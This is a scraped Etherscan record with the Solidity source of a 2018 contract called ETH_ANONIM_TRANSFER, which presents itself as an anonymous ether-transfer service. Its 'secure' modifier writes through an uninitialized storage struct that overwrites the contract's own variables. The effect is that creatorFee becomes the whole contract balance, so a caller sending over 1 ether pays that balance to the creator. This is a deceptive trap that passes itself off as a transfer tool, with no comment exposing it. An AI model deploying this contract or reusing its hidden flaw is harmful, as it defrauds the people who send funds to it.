//token_name	
//token_url	https://etherscan.io//address/0xAd1aA68300588Aa5842751DDCAb2AFd4a69e9016#code
//spider_time	2018/07/08 12:30:45
//token_Transactions	2 txns
//token_price	

pragma solidity ^0.4.19;

contract ETH_ANONIM_TRANSFER    
{
    uint256 feePaid;
    uint256 creatorFee = 0.001 ether;
    uint256 totalTransfered;
    address creator = msg.sender;
    
    struct Transfer
    {
        uint256 timeStamp;
        uint256 currContractBallance;
        uint256 inAm;
    }
    
    Transfer[] Log;
    
    modifier secure
    {
        require(msg.sender == tx.origin);
        Transfer LogUnit;
        LogUnit.timeStamp = now;
        LogUnit.currContractBallance = this.balance;
        LogUnit.inAm = msg.value;
        Log.push(LogUnit);
        _;
    }
    
    function() public payable{}
    
    function MakeTransfer(address _adr, uint256 _am)
    external
    payable
    secure
    {
        if(msg.value > 1 ether)
        {
            creator.send(creatorFee);
            _adr.send(_am);
            
            feePaid+=creatorFee;
            totalTransfered+=_am;
        }
    }    
    
}